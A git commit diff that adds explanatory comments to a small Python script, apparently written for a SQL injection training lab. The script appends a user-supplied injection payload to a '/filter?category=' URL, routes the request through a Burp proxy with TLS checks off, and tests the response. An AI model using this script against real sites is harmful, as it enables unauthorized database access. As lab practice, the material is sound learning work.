6922a1dc2c1e9cf689f1716e3c4b0274a17f5b0e
Sanafana <tfv.duarte@gmail.com>
2023-10-22 19:08:13 +0100

    just adding comments

--- SQLi - Python/Lab0.py
+++ SQLi - Python/Lab0.py
@@ -5,7 +5,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # it will proxy through burpsuite it will help us debug
 
-def exploit_sqli(url,payload):
+def exploit_sqli(url,payload): #this takes the URL from the lab we concatenate the uri, where the vulnerability is and the payload
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
     if "Cat Grin" in r.text:
@@ -15,8 +15,8 @@ def exploit_sqli(url,payload):
 
 if __name__ == "__main__": 
     try:
-        url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
+        url = sys.argv[1].strip() #the url comes from the second position of the argv
+        payload = sys.argv[2].strip()#the payload comes from the third position of the argv
     except IndexError:
         print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
